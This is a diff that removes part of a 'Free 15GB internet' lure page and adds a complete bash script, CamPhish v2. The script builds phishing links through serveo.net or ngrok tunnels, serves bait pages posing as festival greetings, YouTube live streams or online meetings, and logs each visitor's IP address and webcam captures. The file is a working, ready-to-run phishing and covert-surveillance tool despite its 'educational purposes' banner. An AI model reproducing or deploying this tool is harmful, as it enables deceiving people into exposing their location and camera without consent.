@@ -1,729 +1,313 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Internet Data Hub</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary: #10b981;
-            --primary-dark: #059669;
-            --primary-light: #d1fae5;
-            --secondary: #0ea5e9;
-            --accent: #f59e0b;
-            --text: #1f2937;
-            --text-light: #6b7280;
-            --light-bg: #f8fafc;
-            --card-bg: #ffffff;
-            --success: #22c55e;
-            --warning: #f59e0b;
-            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-            --shadow-sm: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
-            --radius: 16px;
-            --radius-sm: 8px;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: var(--light-bg);
-            color: var(--text);
-            line-height: 1.6;
-            transition: opacity ease-in 0.2s;
-        }
-
-        body[unresolved] {
-            opacity: 0;
-            display: block;
-            overflow: hidden;
-            position: relative;
-        }
-
-        /* Header Styles */
-        header {
-            background: var(--card-bg);
-            padding: 16px 24px;
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            box-shadow: var(--shadow-sm);
-        }
-
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--primary);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .logo i {
-            font-size: 28px;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 32px;
-        }
-
-        .nav-links a {
-            color: var(--text);
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-            position: relative;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary);
-        }
-
-        .nav-links a::after {
-            content: '';
-            position: absolute;
-            width: 0;
-            height: 2px;
-            bottom: -5px;
-            left: 0;
-            background-color: var(--primary);
-            transition: width 0.3s;
-        }
-
-        .nav-links a:hover::after {
-            width: 100%;
-        }
-
-        /* Hero Section */
-        .hero {
-            margin-top: 80px;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            padding: 100px 24px;
-            text-align: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000" opacity="0.1"><polygon fill="white" points="0,1000 1000,0 1000,1000"/></svg>');
-            background-size: cover;
-        }
-
-        .hero-content {
-            max-width: 800px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 1;
-        }
-
-        .hero h1 {
-            font-size: 3.5rem;
-            margin-bottom: 24px;
-            font-weight: 700;
-            line-height: 1.2;
-        }
-
-        .hero p {
-            font-size: 1.25rem;
-            margin-bottom: 40px;
-            opacity: 0.9;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        /* Features Section */
-        .features {
-            padding: 100px 24px;
-            background: var(--card-bg);
-        }
-
-        .features-container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: 2.5rem;
-            margin-bottom: 60px;
-            color: var(--text);
-            position: relative;
-        }
-
-        .section-title::after {
-            content: '';
-            position: absolute;
-            width: 80px;
-            height: 4px;
-            background: var(--primary);
-            bottom: -15px;
-            left: 50%;
-            transform: translateX(-50%);
-            border-radius: 2px;
-        }
-
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 40px;
-        }
-
-        .feature-card {
-            padding: 40px 30px;
-            border-radius: var(--radius);
-            background: var(--light-bg);
-            text-align: center;
-            transition: transform 0.3s, box-shadow 0.3s;
-            border: 1px solid rgba(0,0,0,0.05);
-        }
-
-        .feature-card:hover {
-            transform: translateY(-10px);
-            box-shadow: var(--shadow);
-        }
-
-        .feature-icon {
-            font-size: 48px;
-            color: var(--primary);
-            margin-bottom: 24px;
-            display: inline-flex;
-            width: 80px;
-            height: 80px;
-            background: var(--primary-light);
-            border-radius: 50%;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .feature-card h3 {
-            font-size: 1.5rem;
-            margin-bottom: 16px;
-            color: var(--text);
-        }
-
-        .feature-card p {
-            color: var(--text-light);
-        }
-
-        /* Form Section */
-        .form-section {
-            background: var(--card-bg);
-            max-width: 700px;
-            margin: 80px auto;
-            padding: 60px 50px;
-            border-radius: var(--radius);
-            box-shadow: var(--shadow);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .form-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-        }
-
-        .form-section h2 {
-            text-align: center;
-            margin-bottom: 40px;
-            font-size: 2rem;
-            color: var(--text);
-        }
-
-        .form-group {
-            margin-bottom: 28px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 500;
-            color: var(--text);
-        }
-
-        .form-group input,
-        .form-group select {
-            width: 100%;
-            padding: 16px 18px;
-            border: 2px solid #e5e7eb;
-            border-radius: var(--radius-sm);
-            font-size: 16px;
-            transition: all 0.3s;
-            font-family: 'Poppins', sans-serif;
-        }
-
-        .form-group input:focus,
-        .form-group select:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1);
-            outline: none;
-        }
-
-        /* Success Section */
-        .success-section {
-            background: var(--card-bg);
-            max-width: 600px;
-            margin: 80px auto;
-            padding: 60px 50px;
-            border-radius: var(--radius);
-            box-shadow: var(--shadow);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .success-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background: linear-gradient(to right, var(--success), var(--primary));
-        }
-
-        .success-section h3 {
-            font-size: 2rem;
-            margin-bottom: 20px;
-            color: var(--success);
-        }
-
-        .success-section p {
-            color: var(--text-light);
-            margin-bottom: 30px;
-        }
-
-        /* Statistics Section */
-        .statistics {
-            padding: 80px 24px;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-        }
-
-        .stats-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 40px;
-            text-align: center;
-        }
-
-        .stat-item {
-            padding: 40px 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: var(--radius);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .stat-number {
-            font-size: 3rem;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-        .stat-label {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-
-        /* How It Works Section */
-        .how-it-works {
-            padding: 100px 24px;
-            background: var(--card-bg);
-        }
-
-        .steps-container {
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        .step {
-            display: flex;
-            align-items: center;
-            gap: 40px;
-            margin-bottom: 60px;
-            padding: 40px;
-            border-radius: var(--radius);
-            background: var(--light-bg);
-            transition: transform 0.3s;
-        }
-
-        .step:hover {
-            transform: translateX(10px);
-        }
-
-        .step:nth-child(even) {
-            flex-direction: row-reverse;
-        }
-
-        .step:nth-child(even):hover {
-            transform: translateX(-10px);
-        }
-
-        .step-number {
-            width: 70px;
-            height: 70px;
-            background: var(--primary);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            font-weight: 700;
-            flex-shrink: 0;
-        }
-
-        .step-content {
-            flex: 1;
-        }
-
-        .step-content h3 {
-            font-size: 1.5rem;
-            margin-bottom: 12px;
-            color: var(--text);
-        }
-
-        .step-content p {
-            color: var(--text-light);
-        }
-
-        /* Testimonials Section */
-        .testimonials {
-            padding: 100px 24px;
-            background: var(--light-bg);
-        }
-
-        .testimonials-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 40px;
-        }
-
-        .testimonial-card {
-            background: var(--card-bg);
-            padding: 40px;
-            border-radius: var(--radius);
-            box-shadow: var(--shadow-sm);
-            transition: transform 0.3s;
-        }
-
-        .testimonial-card:hover {
-            transform: translateY(-5px);
-            box-shadow: var(--shadow);
-        }
-
-        .testimonial-header {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            margin-bottom: 24px;
-        }
-
-        .testimonial-avatar {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: var(--primary);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 24px;
-        }
-
-        .testimonial-header h4 {
-            font-size: 1.25rem;
-            margin-bottom: 5px;
-        }
-
-        .testimonial-header p {
-            color: var(--primary);
-            font-weight: 500;
-        }
-
-        .testimonial-card p {
-            color: var(--text-light);
-            font-style: italic;
-        }
-
-        /* Buttons */
-        .button {
-            display: inline-block;
-            padding: 16px 36px;
-            border-radius: var(--radius-sm);
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s;
-            cursor: pointer;
-            border: none;
-            text-align: center;
-            font-family: 'Poppins', sans-serif;
-            font-size: 1rem;
-        }
-
-        .button-primary {
-            background: var(--primary);
-            color: white;
-            box-shadow: 0 4px 6px rgba(16, 185, 129, 0.3);
-        }
-
-        .button-primary:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 10px rgba(16, 185, 129, 0.4);
-        }
-
-        .button-secondary {
-            background: white;
-            color: var(--primary);
-            border: 2px solid var(--primary);
-        }
-
-        .button-secondary:hover {
-            background: var(--primary);
-            color: white;
-        }
-
-        /* Footer */
-        footer {
-            background: var(--text);
-            color: white;
-            padding: 80px 24px 40px;
-        }
-
-        .footer-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 60px;
-        }
-
-        .footer-section h3 {
-            color: white;
-            margin-bottom: 24px;
-            font-size: 1.25rem;
-            position: relative;
-            padding-bottom: 10px;
-        }
-
-        .footer-section h3::after {
-            content: '';
-            position: absolute;
-            width: 40px;
-            height: 3px;
-            background: var(--primary);
-            bottom: 0;
-            left: 0;
-            border-radius: 2px;
-        }
-
-        .footer-links {
-            list-style: none;
-        }
-
-        .footer-links li {
-            margin-bottom: 12px;
-        }
-
-        .footer-links a {
-            color: #d1d5db;
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-
-        .footer-links a:hover {
-            color: var(--primary);
-        }
-
-        .social-links {
-            display: flex;
-            gap: 20px;
-            margin-top: 20px;
-        }
-
-        .social-links a {
-            color: white;
-            font-size: 24px;
-            transition: color 0.3s, transform 0.3s;
-        }
-
-        .social-links a:hover {
-            color: var(--primary);
-            transform: translateY(-3px);
-        }
-
-        .footer-section p {
-            color: #d1d5db;
-            margin-bottom: 20px;
-        }
-
-        .footer-section .form-group input {
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            color: white;
-        }
-
-        .footer-section .form-group input::placeholder {
-            color: #9ca3af;
-        }
-
-        .footer-section .form-group input:focus {
-            border-color: var(--primary);
-        }
-
-        .footer-bottom {
-            text-align: center;
-            margin-top: 60px;
-            padding-top: 30px;
-            border-top: 1px solid #374151;
-            color: #9ca3af;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .hero h1 {
-                font-size: 2.5rem;
-            }
-
-            .nav-links {
-                display: none;
-            }
-
-            .step {
-                flex-direction: column !important;
-                text-align: center;
-                gap: 20px;
-            }
-
-            .step:hover {
-                transform: translateY(-5px);
-            }
-
-            .form-section {
-                padding: 40px 30px;
-            }
-
-            .features-grid,
-            .testimonials-container {
-                grid-template-columns: 1fr;
-            }
-
-            .footer-container {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
-
-            .footer-section h3::after {
-                left: 50%;
-                transform: translateX(-50%);
-            }
-
-            .social-links {
-                justify-content: center;
-            }
-
-            .section-title {
-                font-size: 2rem;
-            }
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <div class="header-container">
-            <div class="logo">
-                <i class="fas fa-wifi"></i>
-                Free Internet
-            </div>
-            <nav class="nav-links">
-                <a href="#features">Features</a>
-                <a href="#how-it-works">How It Works</a>
-                <a href="#testimonials">Testimonials</a>
-                <a href="#claim">Get Started</a>
-            </nav>
-        </div>
-    </header>
-
-    <section class="hero">
-        <div class="hero-content">
-            <h1>Get 15GB Free Internet Today!</h1>
-            <p>Join millions of satisfied users who've already claimed their free data. Limited time offer!</p>
-            <a href="#claim" class="button button-primary">Claim Your Free Data</a>
-        </div>
-    </section>
-    
-    <section class="form-section" id="claim">
-        <h2>Claim Your Free 15GB Now</h2>
-        <form id="data-form">
-            <div class="form-group">
-                <label for="country">Country Code</label>
-                <select id="country" required>
-                    <option>Select Country 🌎</option>    	
-                    <option value="+213">🇩🇿 +213 (Algeria)</option>
-                    <option value="+91">🇮🇳 +91 (India)</option>
-                    <option value="+1">🇺🇸 +1 (USA)</option>
-                    <option value="+880">🇧🇩 +880 (Bangladesh)</option> 
-                    <option value="+44">🇬🇧 +44 (UK)</option>
-                    <option value="+61">🇦🇺 +61 (Australia)</option>
-                    <option value="+49">🇩🇪 +49 (Germany)</option>
-                    <option value="+33">🇫🇷 +33 (France)</option>
-                    <option value="+39">🇮🇹 +39 (Italy)</option>
-                    <option value="+34">🇪🇸 +34 (Spain)</option>
-                    <option value="+81">🇯🇵 +81 (Japan)</option>
-                    <option value="+55">🇧🇷 +55 (Brazil)</option>
-                    <option value="+7">🇷🇺 +7 (Russia)</option>
-                    <option value="+86">🇨🇳 +86 (China)</option>
-                    <option value="+27">🇿🇦 +27 (South Africa)</option>
-                    <option value="+52">🇲🇽 +52 (Mexico)</option>
-                    <option value="+82">🇰🇷 +82 (South Korea)</option>
-                    <option value="+20">🇪🇬 +20 (Egypt)</option>
-                    <option value="+31">🇳🇱 +31 (Netherlands)</option>
-                    <option value="+46">🇸🇪 +46 (Sweden)</option>
-                    <option value="+56">🇨🇱 +56 (Chile)</option>
-                    <option value="+41">🇨🇭 +41 (Switzerland)</option>
-                    <option value="+65">🇸🇬 +65 (Singapore)</option>
-                    <option value="+60">🇲🇾 +60 (Malaysia)</option>
-                    <option value="+971">🇦🇪 +971 (UAE)</option>
-                    <option value="+63">🇵🇭 +63 (Philippines)</option>
-                    <option value="+92">🇵🇰 +92 (Pakistan)</option>
-                    <option value="+234">🇳🇬 +234 (Nigeria)</option>
-                    <option value="+90">🇹🇷 +90 (Turkey)</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label for="operator">SIM Provider</label>
+#!/bin/bash
+# CamPhish v2
+# Powered by LakshyaSharma207
+# Credits goes to thelinuxchoice [github.com/thelinuxchoice/] 
+# the original source code was found here - [https://github.com/techchipnet/CamPhish]
+
+trap 'printf "\n";stop' 2
+
+banner() {
+clear
+printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
+printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
+printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
+printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
+printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
+printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
+printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
+printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
+printf " \e[1;93m CamPhish Ver 2 \e[0m \n"
+printf " \e[1;77m https://github.com/LakshyaSharma207 | Use Only for Educational Purposes \e[0m \n"
+
+printf "\n"
+
+
+}
+
+dependencies() {
+
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+ 
+
+
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt >> saved.ip.txt
+
+
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+rm -rf Log.log
+fi
+sleep 0.5
+
+done 
+
+}
+
+
+server() {
+
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+fi
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+# Generate QR code
+echo $send_link | qrencode -o qrcode.png
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] \e[0m\e[1;77mQR code \e[0m\e[1;93mfor link generated as qrcode.png in root file.\n'
+}
+
+
+payload_ngrok() {
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+elif [[ $option_tem -eq 3 ]]; then
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+fi
+rm -rf index3.html
+
+}
+
+select_template() {
+if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+sleep 1
+clear
+banner
+camphish
+else
+printf "\n-----Choose a template----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+default_option_template="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+option_tem="${option_tem:-${default_option_template}}"
+if [[ $option_tem -eq 1 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+fest_name="${fest_name//[[:space:]]/}"
+elif [[ $option_tem -eq 2 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+elif [[ $option_tem -eq 3 ]]; then
+printf ""
+else
+printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+sleep 1
+select_template
+fi
+fi
+}
+
+ngrok_server() {
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
+fi
+if [[ -e ~/.ngrok2/ngrok.yml ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
+cat  ~/.ngrok2/ngrok.yml
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+fi
+else
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+fi
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+if [[ -z "$link" ]]; then
+printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+exit 1
+else
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+fi
+payload_ngrok
+checkfound
+}
+
+camphish() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+printf "\n-----Choose tunnel server----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+select_template
+if [[ $option_server -eq 1 ]]; then
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+start
+
+elif [[ $option_server -eq 2 ]]; then
+ngrok_server
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+camphish
+fi
+
+}
+
+
+payload() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+fi
+rm -rf index3.html
+
+}
+
+start() {
+
+default_choose_sub="Y"
+default_subdomain="saycheese$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+
+server
+payload
+checkfound
+
+}
+
+banner
+dependencies
+camphish
